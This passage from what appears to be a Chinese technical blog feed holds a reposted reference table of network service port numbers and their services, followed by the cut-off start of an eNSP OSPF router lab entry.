class="line">11211端口：memcache（高速缓存系统）</span><br><span class="line">27017端口：mongoDB数据库默认端口</span><br><span class="line">22122端口：fastdfs服务器默认端口</span><br></pre></td></tr></table></figure><h2 id="著名端口"><a href="#著名端口" class="headerlink" title="著名端口"></a>著名端口</h2><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1</td><td>tcpmux</td><td>TCP 端口服务多路复用</td></tr><tr><td>5</td><td>rje</td><td>远程作业入口</td></tr><tr><td>7</td><td>echo</td><td>Echo 服务</td></tr><tr><td>9</td><td>discard</td><td>用于连接测试的空服务</td></tr><tr><td>11</td><td>systat</td><td>用于列举连接了的端口的系统状态</td></tr><tr><td>13</td><td>daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>17</td><td>qotd</td><td>给连接了的主机发送每日格言</td></tr><tr><td>18</td><td>msp</td><td>消息发送协议</td></tr><tr><td>19</td><td>chargen</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP 数据端口</td></tr><tr><td>21</td><td>ftp</td><td>文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用</td></tr><tr><td>22</td><td>ssh</td><td>安全 Shell（SSH）服务</td></tr><tr><td>23</td><td>telnet</td><td>Telnet 服务</td></tr><tr><td>25</td><td>smtp</td><td>简单邮件传输协议（SMTP）</td></tr><tr><td>37</td><td>time</td><td>时间协议</td></tr><tr><td>39</td><td>rlp</td><td>资源定位协议</td></tr><tr><td>42</td><td>nameserver</td><td>互联网名称服务</td></tr><tr><td>43</td><td>nicname</td><td>WHOIS 目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>用于基于 TCP&#x2F;IP 验证和访问的终端访问控制器访问控制系统</td></tr><tr><td>50</td><td>re-mail-ck</td><td>远程邮件检查协议</td></tr><tr><td>53</td><td>domain</td><td>域名服务（如 BIND）</td></tr><tr><td>63</td><td>whois++</td><td>WHOIS++，被扩展了的 WHOIS 服务</td></tr><tr><td>67</td><td>bootps</td><td>引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用</td></tr><tr><td>69</td><td>tftp</td><td>小文件传输协议（TFTP）</td></tr><tr><td>70</td><td>gopher</td><td>Gopher 互联网文档搜寻和检索</td></tr><tr><td>71</td><td>netrjs-1</td><td>远程作业服务</td></tr><tr><td>72</td><td>netrjs-2</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-3</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-4</td><td>远程作业服务</td></tr><tr><td>79</td><td>finger</td><td>用于用户联系信息的 Finger 服务</td></tr><tr><td>80</td><td>http</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP）</td></tr><tr><td>88</td><td>kerberos</td><td>Kerberos 网络验证系统</td></tr><tr><td>95</td><td>supdup</td><td>Telnet 协议扩展</td></tr><tr><td>101</td><td>hostname</td><td>SRI-NIC 机器上的主机名服务</td></tr><tr><td>102</td><td>iso-tsap</td><td>ISO 开发环境（ISODE）网络应用</td></tr><tr><td>105</td><td>csnet-ns</td><td>邮箱名称服务器；也被 CSO 名称服务器使用</td></tr><tr><td>107</td><td>rtelnet</td><td>远程 Telnet</td></tr><tr><td>109</td><td>pop2</td><td>邮局协议版本2</td></tr><tr><td>110</td><td>pop3</td><td>邮局协议版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用</td></tr><tr><td>113</td><td>auth</td><td>验证和身份识别协议</td></tr><tr><td>115</td><td>sftp</td><td>安全文件传输协议（SFTP）服务</td></tr><tr><td>117</td><td>uucp-path</td><td>Unix 到 Unix 复制协议（UUCP）路径服务</td></tr><tr><td>119</td><td>nntp</td><td>用于 USENET 讨论系统的网络新闻传输协议（NNTP）</td></tr><tr><td>123</td><td>ntp</td><td>网络时间协议（NTP）</td></tr><tr><td>137</td><td>netbios-ns</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务</td></tr><tr><td>143</td><td>imap</td><td>互联网消息存取协议（IMAP）</td></tr><tr><td>161</td><td>snmp</td><td>简单网络管理协议（SNMP）</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMP 的陷阱</td></tr><tr><td>163</td><td>cmip-man</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>164</td><td>cmip-agent</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>174</td><td>mailq</td><td>MAILQ</td></tr><tr><td>177</td><td>xdmcp</td><td>X 显示管理器控制协议</td></tr><tr><td>178</td><td>nextstep</td><td>NeXTStep 窗口服务器</td></tr><tr><td>179</td><td>bgp</td><td>边界网络协议</td></tr><tr><td>191</td><td>prospero</td><td>Cliffod Neuman 的 Prospero 服务</td></tr><tr><td>194</td><td>irc</td><td>互联网中继聊天（IRC）</td></tr><tr><td>199</td><td>smux</td><td>SNMP UNIX 多路复用</td></tr><tr><td>201</td><td>at-rtmp</td><td>AppleTalk 选路</td></tr><tr><td>202</td><td>at-nbp</td><td>AppleTalk 名称绑定</td></tr><tr><td>204</td><td>at-echo</td><td>AppleTalk echo 服务</td></tr><tr><td>206</td><td>at-zis</td><td>AppleTalk 区块信息</td></tr><tr><td>209</td><td>qmtp</td><td>快速邮件传输协议（QMTP）</td></tr><tr><td>210</td><td>z39.50</td><td>NISO Z39.50 数据库</td></tr><tr><td>213</td><td>ipx</td><td>互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议</td></tr><tr><td>220</td><td>imap3</td><td>互联网消息存取协议版本3</td></tr><tr><td>245</td><td>link</td><td>LINK</td></tr><tr><td>347</td><td>fatserv</td><td>Fatmen 服务器</td></tr><tr><td>363</td><td>rsvp_tunnel</td><td>RSVP 隧道</td></tr><tr><td>369</td><td>rpc2portmap</td><td>Coda 文件系统端口映射器</td></tr><tr><td>370</td><td>codaauth2</td><td>Coda 文件系统验证服务</td></tr><tr><td>372</td><td>ulistproc</td><td>UNIX Listserv</td></tr><tr><td>389</td><td>ldap</td><td>轻型目录存取协议（LDAP）</td></tr><tr><td>427</td><td>svrloc</td><td>服务位置协议（SLP）</td></tr><tr><td>434</td><td>mobileip-agent</td><td>可移互联网协议（IP）代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>可移互联网协议（IP）管理器</td></tr><tr><td>443</td><td>https</td><td>安全超文本传输协议（HTTP）</td></tr><tr><td>444</td><td>snpp</td><td>小型网络分页协议</td></tr><tr><td>445</td><td>microsoft-ds</td><td>通过 TCP&#x2F;IP 的服务器消息块（SMB）</td></tr><tr><td>464</td><td>kpasswd</td><td>Kerberos 口令和钥匙改换服务</td></tr><tr><td>468</td><td>photuris</td><td>Photuris 会话钥匙管理协议</td></tr><tr><td>487</td><td>saft</td><td>简单不对称文件传输（SAFT）协议</td></tr><tr><td>488</td><td>gss-http</td><td>用于 HTTP 的通用安全服务（GSS）</td></tr><tr><td>496</td><td>pim-rp-disc</td><td>用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC）</td></tr><tr><td>500</td><td>isakmp</td><td>互联网安全关联和钥匙管理协议（ISAKMP）</td></tr><tr><td>535</td><td>iiop</td><td>互联网内部对象请求代理协议（IIOP）</td></tr><tr><td>538</td><td>gdomap</td><td>GNUstep 分布式对象映射器（GDOMAP）</td></tr><tr><td>546</td><td>dhcpv6-client</td><td>动态主机配置协议（DHCP）版本6客户</td></tr><tr><td>547</td><td>dhcpv6-server</td><td>动态主机配置协议（DHCP）版本6服务</td></tr><tr><td>554</td><td>rtsp</td><td>实时流播协议（RTSP）</td></tr><tr><td>563</td><td>nntps</td><td>通过安全套接字层的网络新闻传输协议（NNTPS）</td></tr><tr><td>565</td><td>whoami</td><td>whoami</td></tr><tr><td>587</td><td>submission</td><td>邮件消息提交代理（MSA）</td></tr><tr><td>610</td><td>npmp-local</td><td>网络外设管理协议（NPMP）本地 &#x2F; 分布式排队系统（DQS）</td></tr><tr><td>611</td><td>npmp-gui</td><td>网络外设管理协议（NPMP）GUI &#x2F; 分布式排队系统（DQS）</td></tr><tr><td>612</td><td>hmmp-ind</td><td>HMMP 指示 &#x2F; DQS</td></tr><tr><td>631</td><td>ipp</td><td>互联网打印协议（IPP）</td></tr><tr><td>636</td><td>ldaps</td><td>通过安全套接字层的轻型目录访问协议（LDAPS）</td></tr><tr><td>674</td><td>acap</td><td>应用程序配置存取协议（ACAP）</td></tr><tr><td>694</td><td>ha-cluster</td><td>用于带有高可用性的群集的心跳服务</td></tr><tr><td>749</td><td>kerberos-adm</td><td>Kerberos 版本5（v5）的“kadmin”数据库管理</td></tr><tr><td>750</td><td>kerberos-iv</td><td>Kerberos 版本4（v4）服务</td></tr><tr><td>765</td><td>webster</td><td>网络词典</td></tr><tr><td>767</td><td>phonebook</td><td>网络电话簿</td></tr><tr><td>873</td><td>rsync</td><td>rsync 文件传输服务</td></tr><tr><td>992</td><td>telnets</td><td>通过安全套接字层的 Telnet（TelnetS）</td></tr><tr><td>993</td><td>imaps</td><td>通过安全套接字层的互联网消息存取协议（IMAPS）</td></tr><tr><td>994</td><td>ircs</td><td>通过安全套接字层的互联网中继聊天（IRCS）</td></tr><tr><td>995</td><td>pop3s</td><td>通过安全套接字层的邮局协议版本3（POPS3）</td></tr></tbody></table><h2 id="UNIX-特有的端口"><a href="#UNIX-特有的端口" class="headerlink" title="UNIX 特有的端口"></a>UNIX 特有的端口</h2><p>以下端口是 UNIX 特有的，涉及了从电子邮件到验证不等的服务。在方括号内的名称（如 [service]）是服务的守护进程名称或它的常用别名。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>512&#x2F;tcp</td><td>exec</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>512&#x2F;udp</td><td>biff [comsat]</td><td>异步邮件客户（biff）和服务（comsat）</td></tr><tr><td>513&#x2F;tcp</td><td>login</td><td>远程登录（rlogin）</td></tr><tr><td>513&#x2F;udp</td><td>who [whod]</td><td>登录的用户列表</td></tr><tr><td>514&#x2F;tcp</td><td>shell [cmd]</td><td>不必登录的远程 shell（rshell）和远程复制（rcp）</td></tr><tr><td>514&#x2F;udp</td><td>syslog</td><td>UNIX 系统日志服务</td></tr><tr><td>515</td><td>printer [spooler]</td><td>打印机（lpr）假脱机</td></tr><tr><td>517&#x2F;udp</td><td>talk</td><td>远程对话服务和客户</td></tr><tr><td>518&#x2F;udp</td><td>ntalk</td><td>网络交谈（ntalk），远程对话服务和客户</td></tr><tr><td>519</td><td>utime [unixtime]</td><td>UNIX 时间协议（utime）</td></tr><tr><td>520&#x2F;tcp</td><td>efs</td><td>扩展文件名服务器（EFS）</td></tr><tr><td>520&#x2F;udp</td><td>router [route, routed]</td><td>选路信息协议（RIP）</td></tr><tr><td>521</td><td>ripng</td><td>用于互联网协议版本6（IPv6）的选路信息协议</td></tr><tr><td>525</td><td>timed [timeserver]</td><td>时间守护进程（timed）</td></tr><tr><td>526&#x2F;tcp</td><td>tempo [newdate]</td><td>Tempo</td></tr><tr><td>530&#x2F;tcp</td><td>courier [rpc]</td><td>Courier 远程过程调用（RPC）协议</td></tr><tr><td>531&#x2F;tcp</td><td>conference [chat]</td><td>互联网中继聊天</td></tr><tr><td>532</td><td>netnews</td><td>Netnews</td></tr><tr><td>533&#x2F;udp</td><td>netwall</td><td>用于紧急广播的 Netwall</td></tr><tr><td>540&#x2F;tcp</td><td>uucp [uucpd]</td><td>Unix 到 Unix 复制服务</td></tr><tr><td>543&#x2F;tcp</td><td>klogin</td><td>Kerberos 版本5（v5）远程登录</td></tr><tr><td>544&#x2F;tcp</td><td>kshell</td><td>Kerberos 版本5（v5）远程 shell</td></tr><tr><td>548</td><td>afpovertcp</td><td>通过传输控制协议（TCP）的 Appletalk 文件编制协议（AFP）</td></tr><tr><td>556</td><td>remotefs [rfs_server, rfs]</td><td>Brunhoff 的远程文件系统（RFS）</td></tr></tbody></table><h2 id="注册的端口"><a href="#注册的端口" class="headerlink" title="注册的端口"></a>注册的端口</h2><p>列举了由网络和软件社区向 IANA 提交的要在端口号码列表中正式注册的端口。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1080</td><td>socks</td><td>SOCKS 网络应用程序代理服务</td></tr><tr><td>1236</td><td>bvcontrol [rmtcfg]</td><td>Garcilis Packeten 远程配置服务器</td></tr><tr><td>1300</td><td>h323hostcallsc</td><td>H.323 电话会议主机电话安全</td></tr><tr><td>1433</td><td>ms-sql-s</td><td>Microsoft SQL 服务器</td></tr><tr><td>1434</td><td>ms-sql-m</td><td>Microsoft SQL 监视器</td></tr><tr><td>1494</td><td>ica</td><td>Citrix ICA 客户</td></tr><tr><td>1512</td><td>wins</td><td>Microsoft Windows 互联网名称服务器</td></tr><tr><td>1524</td><td>ingreslock</td><td>Ingres 数据库管理系统（DBMS）锁定服务</td></tr><tr><td>1525</td><td>prospero-np</td><td>无特权的 Prospero</td></tr><tr><td>1645</td><td>datametrics [old-radius]</td><td>Datametrics &#x2F; 从前的 radius 项目</td></tr><tr><td>1646</td><td>sa-msg-port [oldradacct]</td><td>sa-msg-port &#x2F; 从前的 radacct 项目</td></tr><tr><td>1649</td><td>kermit</td><td>Kermit 文件传输和管理服务</td></tr><tr><td>1701</td><td>l2tp [l2f]</td><td>第2层隧道服务（LT2P） &#x2F; 第2层转发（L2F）</td></tr><tr><td>1718</td><td>h323gatedisc</td><td>H.323 电讯守门装置发现机制</td></tr><tr><td>1719</td><td>h323gatestat</td><td>H.323 电讯守门装置状态</td></tr><tr><td>1720</td><td>h323hostcall</td><td>H.323 电讯主持电话设置</td></tr><tr><td>1758</td><td>tftp-mcast</td><td>小文件 FTP 组播</td></tr><tr><td>1759</td><td>mtftp</td><td>组播小文件 FTP（MTFTP）</td></tr><tr><td>1789</td><td>hello</td><td>Hello 路由器通信端口</td></tr><tr><td>1812</td><td>radius</td><td>Radius 拨号验证和记帐服务</td></tr><tr><td>1813</td><td>radius-acct</td><td>Radius 记帐</td></tr><tr><td>1911</td><td>mtp</td><td>Starlight 网络多媒体传输协议（MTP）</td></tr><tr><td>1985</td><td>hsrp</td><td>Cisco 热备用路由器协议</td></tr><tr><td>1986</td><td>licensedaemon</td><td>Cisco 许可管理守护进程</td></tr><tr><td>1997</td><td>gdp-port</td><td>Cisco 网关发现协议（GDP）</td></tr><tr><td>2049</td><td>nfs [nfsd]</td><td>网络文件系统（NFS）</td></tr><tr><td>2102</td><td>zephyr-srv</td><td>Zephyr 通知传输和发送服务器</td></tr><tr><td>2103</td><td>zephyr-clt</td><td>Zephyr serv-hm 连接</td></tr><tr><td>2104</td><td>zephyr-hm</td><td>Zephyr 主机管理器</td></tr><tr><td>2401</td><td>cvspserver</td><td>并行版本系统（CVS）客户 &#x2F; 服务器操作</td></tr><tr><td>2430&#x2F;tcp</td><td>venus</td><td>用于 Coda 文件系统（codacon 端口）的 Venus 缓存管理器</td></tr><tr><td>2430&#x2F;udp</td><td>venus</td><td>用于 Coda 文件系统（callback&#x2F;wbc interface 界面）的 Venus 缓存管理器</td></tr><tr><td>2431&#x2F;tcp</td><td>venus-se</td><td>Venus 传输控制协议（TCP）的副作用</td></tr><tr><td>2431&#x2F;udp</td><td>venus-se</td><td>Venus 用户数据报协议（UDP）的副作用</td></tr><tr><td>2432&#x2F;udp</td><td>codasrv</td><td>Coda 文件系统服务器端口</td></tr><tr><td>2433&#x2F;tcp</td><td>codasrv-se</td><td>Coda 文件系统 TCP 副作用</td></tr><tr><td>2433&#x2F;udp</td><td>codasrv-se</td><td>Coda 文件系统 UDP SFTP 副作用</td></tr><tr><td>2600</td><td>hpstgmgr [zebrasrv]</td><td>HPSTGMGR；Zebra 选路</td></tr><tr><td>2601</td><td>discp-client [zebra]</td><td>discp 客户；Zebra 集成的 shell</td></tr><tr><td>2602</td><td>discp-server [ripd]</td><td>discp 服务器；选路信息协议守护进程（ripd）</td></tr><tr><td>2603</td><td>servicemeter [ripngd]</td><td>服务计量；用于 IPv6 的 RIP 守护进程</td></tr><tr><td>2604</td><td>nsc-ccs [ospfd]</td><td>NSC CCS；开放式短路径优先守护进程（ospfd）</td></tr><tr><td>2605</td><td>nsc-posa</td><td>NSC POSA；边界网络协议守护进程（bgpd）</td></tr><tr><td>2606</td><td>netmon [ospf6d]</td><td>Dell Netmon；用于 IPv6 的 OSPF 守护进程（ospf6d）</td></tr><tr><td>2809</td><td>corbaloc</td><td>公共对象请求代理体系（CORBA）命名服务定位器</td></tr><tr><td>3130</td><td>icpv2</td><td>互联网缓存协议版本2（v2）；被 Squid 代理缓存服务器使用</td></tr><tr><td>3306</td><td>mysql</td><td>MySQL 数据库服务</td></tr><tr><td>3346</td><td>trnsprntproxy</td><td>Trnsprnt 代理</td></tr><tr><td>4011</td><td>pxe</td><td>执行前环境（PXE）服务</td></tr><tr><td>4321</td><td>rwhois</td><td>远程 Whois（rwhois）服务</td></tr><tr><td>4444</td><td>krb524</td><td>Kerberos 版本5（v5）到版本4（v4）门票转换器</td></tr><tr><td>5002</td><td>rfe</td><td>无射频以太网（RFE）音频广播系统</td></tr><tr><td>5308</td><td>cfengine</td><td>配置引擎（Cfengine）</td></tr><tr><td>5999</td><td>cvsup [CVSup]</td><td>CVSup 文件传输和更新工具</td></tr><tr><td>6000</td><td>x11 [X]</td><td>X 窗口系统服务</td></tr><tr><td>7000</td><td>afs3-fileserver</td><td>Andrew 文件系统（AFS）文件服务器</td></tr><tr><td>7001</td><td>afs3-callback</td><td>用于给缓存管理器回电的 AFS 端口</td></tr><tr><td>7002</td><td>afs3-prserver</td><td>AFS 用户和组群数据库</td></tr><tr><td>7003</td><td>afs3-vlserver</td><td>AFS 文件卷位置数据库</td></tr><tr><td>7004</td><td>afs3-kaserver</td><td>AFS Kerberos 验证服务</td></tr><tr><td>7005</td><td>afs3-volser</td><td>AFS 文件卷管理服务器</td></tr><tr><td>7006</td><td>afs3-errors</td><td>AFS 错误解释服务</td></tr><tr><td>7007</td><td>afs3-bos</td><td>AFS 基本监查进程</td></tr><tr><td>7008</td><td>afs3-update</td><td>AFS 服务器到服务器更新器</td></tr><tr><td>7009</td><td>afs3-rmtsys</td><td>AFS 远程缓存管理器服务</td></tr><tr><td>9876</td><td>sd</td><td>会话指引器</td></tr><tr><td>10080</td><td>amanda</td><td>高级 Maryland 自动网络磁盘归档器（Amanda）备份服务</td></tr><tr><td>11371</td><td>pgpkeyserver</td><td>良好隐私（PGP） &#x2F; GNU 隐私卫士（GPG）公钥服务器</td></tr><tr><td>11720</td><td>h323callsigalt</td><td>H.323 调用信号交替</td></tr><tr><td>13720</td><td>bprd</td><td>Veritas NetBackup 请求守护进程（bprd）</td></tr><tr><td>13721</td><td>bpdbm</td><td>Veritas NetBackup 数据库管理器（bpdbm）</td></tr><tr><td>13722</td><td>bpjava-msvc</td><td>Veritas NetBackup Java &#x2F; Microsoft Visual C++ (MSVC) 协议</td></tr><tr><td>13724</td><td>vnetd</td><td>Veritas 网络工具</td></tr><tr><td>13782</td><td>bpcd</td><td>Vertias NetBackup</td></tr><tr><td>13783</td><td>vopied</td><td>Veritas VOPIED 协议</td></tr><tr><td>22273</td><td>wnn6 [wnn4]</td><td>假名&#x2F;汉字转换系统</td></tr><tr><td>26000</td><td>quake</td><td>Quake（以及相关的）多人游戏服务器</td></tr><tr><td>26208</td><td>wnn6-ds</td><td></td></tr><tr><td>33434</td><td>traceroute</td><td>Traceroute 网络跟踪工具</td></tr><tr><td>注: &#x2F;etc&#x2F;services中的注释如下：端口1236被注册为“bvcontrol”，但是它也被 Gracilis Packeten 远程配置服务器使用。正式名称被列为主要名称，未注册的名称被列为别名。 在&#x2F;etc&#x2F;services中的注释：端口 2600 到 2606 被 zebra 软件包未经注册而使用。主要名称是被注册的名称，被 zebra 使用的未注册名称被列为别名。 &#x2F;etc&#x2F;services 文件中的注释：该端口被注册为 wnn6，但是还在 FreeWnn 软件包中使用了未注册的“wnn4”。</td><td></td><td></td></tr></tbody></table><h2 id="数据报传递协议端口"><a href="#数据报传递协议端口" class="headerlink" title="数据报传递协议端口"></a>数据报传递协议端口</h2><p>显示了一个和数据报传递协议（DDP）有关的端口列表。DDP 在 AppleTalk 网络上被使用。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1&#x2F;ddp</td><td>rtmp</td><td>路由表管理协议</td></tr><tr><td>2&#x2F;ddp</td><td>nbp</td><td>名称绑定协议</td></tr><tr><td>4&#x2F;ddp</td><td>echo</td><td>AppleTalk Echo 协议</td></tr><tr><td>6&#x2F;ddp</td><td>zip</td><td>区块信息协议</td></tr></tbody></table><h2 id="Kerberos（工程-Athena-MIT）端口"><a href="#Kerberos（工程-Athena-MIT）端口" class="headerlink" title="Kerberos（工程 Athena&#x2F;MIT）端口"></a>Kerberos（工程 Athena&#x2F;MIT）端口</h2><p>和 Kerberos 网络验证协议相关的端口列表。在标记的地方，v5 代表 Kerberos 版本5协议。注意，这些端口没有在 IANA 注册。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>751</td><td>kerberos_master</td><td>Kerberos 验证</td></tr><tr><td>752</td><td>passwd_server</td><td>Kerberos 口令（kpasswd）服务器</td></tr><tr><td>754</td><td>krb5_prop</td><td>Kerberos v5 从属传播</td></tr><tr><td>760</td><td>krbupdate [kreg]</td><td>Kerberos 注册</td></tr><tr><td>1109</td><td>kpop</td><td>Kerberos 邮局协议（KPOP）</td></tr><tr><td>2053</td><td>knetd</td><td>Kerberos 多路分用器</td></tr><tr><td>2105</td><td>eklogin</td><td>Kerberos v5 加密的远程登录（rlogin）</td></tr></tbody></table><h2 id="未注册的端口"><a href="#未注册的端口" class="headerlink" title="未注册的端口"></a>未注册的端口</h2><p>一个未注册的端口列表。这些端口可能被安装在你的红帽企业 Linux 系统上的服务或协议使用，或者它们是在红帽企业 Linux 和运行其它操作系统的机器通信所必需的端口。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>15&#x2F;tcp</td><td>netstat</td><td>网络状态（netstat）</td></tr><tr><td>98&#x2F;tcp</td><td>linuxconf</td><td>Linuxconf Linux 管理工具</td></tr><tr><td>106</td><td>poppassd</td><td>邮局协议口令改变守护进程（POPPASSD）</td></tr><tr><td>465&#x2F;tcp</td><td>smtps</td><td>通过安全套接字层的简单邮件传输协议（SMTPS）</td></tr><tr><td>616&#x2F;tcp</td><td>gii</td><td>使用网关的（选路守护进程）互动界面</td></tr><tr><td>808</td><td>omirr [omirrd]</td><td>联机镜像（Omirr）文件镜像服务</td></tr><tr><td>871&#x2F;tcp</td><td>supfileserv</td><td>软件升级协议（SUP）服务器</td></tr><tr><td>901&#x2F;tcp</td><td>swat</td><td>Samba 万维网管理工具（SWAT）</td></tr><tr><td>953</td><td>rndc</td><td>Berkeley 互联网名称域版本9（BIND 9）远程名称守护进程配置工具</td></tr><tr><td>1127</td><td>sufiledbg</td><td>软件升级协议（SUP）调试</td></tr><tr><td>1178&#x2F;tcp</td><td>skkserv</td><td>简单假名到汉字（SKK）日文输入服务器</td></tr><tr><td>1313&#x2F;tcp</td><td>xtel</td><td>法国 Minitel 文本信息系统</td></tr><tr><td>1529&#x2F;tcp</td><td>support [prmsd, gnatsd]</td><td>GNATS 错误跟踪系统</td></tr><tr><td>2003&#x2F;tcp</td><td>cfinger</td><td>GNU Finger 服务</td></tr><tr><td>2150</td><td>ninstall</td><td>网络安装服务</td></tr><tr><td>2988</td><td>afbackup</td><td>afbackup 客户-服务器备份系统</td></tr><tr><td>3128&#x2F;tcp</td><td>squid</td><td>Squid 万维网代理缓存</td></tr><tr><td>3455</td><td>prsvp</td><td>RSVP 端口</td></tr><tr><td>5432</td><td>postgres</td><td>PostgreSQL 数据库</td></tr><tr><td>4557&#x2F;tcp</td><td>fax</td><td>FAX 传输服务（旧服务）</td></tr><tr><td>4559&#x2F;tcp</td><td>hylafax</td><td>HylaFAX 客户-服务器协议（新服务）</td></tr><tr><td>5232</td><td>sgi-dgl</td><td>SGI 分布式图形库</td></tr><tr><td>5354</td><td>noclog</td><td>NOCOL 网络操作中心记录守护进程（noclogd）</td></tr><tr><td>5355</td><td>hostmon</td><td>NOCOL 网络操作中心主机监视</td></tr><tr><td>5680&#x2F;tcp</td><td>canna</td><td>Canna 日文字符输入界面</td></tr><tr><td>6010&#x2F;tcp</td><td>x11-ssh-offset</td><td>安全 Shell（SSH）X11 转发偏移</td></tr><tr><td>6667</td><td>ircd</td><td>互联网中继聊天守护进程（ircd）</td></tr><tr><td>7100&#x2F;tcp</td><td>xfs</td><td>X 字体服务器（XFS）</td></tr><tr><td>7666&#x2F;tcp</td><td>tircproxy</td><td>Tircproxy IRC 代理服务</td></tr><tr><td>8008</td><td>http-alt</td><td>超文本传输协议（HTTP）的另一选择</td></tr><tr><td>8080</td><td>webcache</td><td>万维网（WWW）缓存服务</td></tr><tr><td>8081</td><td>tproxy</td><td>透明代理</td></tr><tr><td>9100&#x2F;tcp</td><td>jetdirect [laserjet, hplj]</td><td>Hewlett-Packard (HP) JetDirect 网络打印服务</td></tr><tr><td>9359</td><td>mandelspawn [mandelbrot]</td><td>用于 X 窗口系统的并行 Mandelbrot 生成程序</td></tr><tr><td>10081</td><td>kamanda</td><td>使用 Kerberos 的 Amanda 备份服务</td></tr><tr><td>10082&#x2F;tcp</td><td>amandaidx</td><td>Amanda 备份服务</td></tr><tr><td>10083&#x2F;tcp</td><td>amidxtape</td><td>Amanda 备份服务</td></tr><tr><td>20011</td><td>isdnlog</td><td>综合业务数字网（ISDN）登录系统</td></tr><tr><td>20012</td><td>vboxd</td><td>ISDN 音箱守护进程（vboxd）</td></tr><tr><td>22305&#x2F;tcp</td><td>wnn4_Kr</td><td>kWnn 韩文输入系统</td></tr><tr><td>22289&#x2F;tcp</td><td>wnn4_Cn</td><td>cWnn 中文输入系统</td></tr><tr><td>22321&#x2F;tcp</td><td>wnn4_Tw</td><td>tWnn 中文输入系统（台湾）</td></tr><tr><td>24554</td><td>binkp</td><td>Binkley TCP&#x2F;IP Fidonet 邮寄程序守护进程</td></tr><tr><td>27374</td><td>asp</td><td>地址搜索协议</td></tr><tr><td>60177</td><td>tfido</td><td>Ifmail FidoNet 兼容邮寄服务</td></tr><tr><td>60179</td><td>fido</td><td>FidoNet 电子邮件和新闻网络</td></tr></tbody></table><p>原文链接：</p><p><a href="https://developer.aliyun.com/article/850146">https://developer.aliyun.com/article/850146</a></p><p><a href="https://cloud.tencent.com/developer/article/1702021">https://cloud.tencent.com/developer/article/1702021</a></p><p><a href="https://blog.csdn.net/Geroge_Ming/article/details/109711897">https://blog.csdn.net/Geroge_Ming/article/details/109711897</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用服务端口号&quot;&gt;&lt;a href=&quot;#常用服务端口号&quot; class=&quot;headerlink&quot; title=&quot;常用服务端口号&quot;&gt;&lt;/a&gt;常用服务端口号&lt;/h1&gt;&lt;h2 id=&quot;原文链接：&quot;&gt;&lt;a href=&quot;#原文链接：&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-OSPF</title>
    <link href="https://w-sqrt7.github.io/2024/03/01/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-OSPF/"/>
    <id>https://w-sqrt7.github.io/2024/03/01/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-OSPF/</id>
    <published>2024-03-01T14:18:19.595Z</published>
    <updated>2024-05-12T10:23:12.697Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-OSPF"><a href="#网基实践题-OSPF" class="headerlink" title="网基实践题-OSPF"></a>网基实践题-OSPF</h1><h2 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h2><p><img src="/2024/03/01/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-OSPF/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-03%20161825.png" alt="屏幕截图 2024-03-03 161825"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>首先将pc机的ip，子网掩码，网关等按上图要求配置完成，然后开始开始配置路由器的各个端口的ip地址</p><p>AR1的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR 1</span><br><span class="line">[AR 1]int 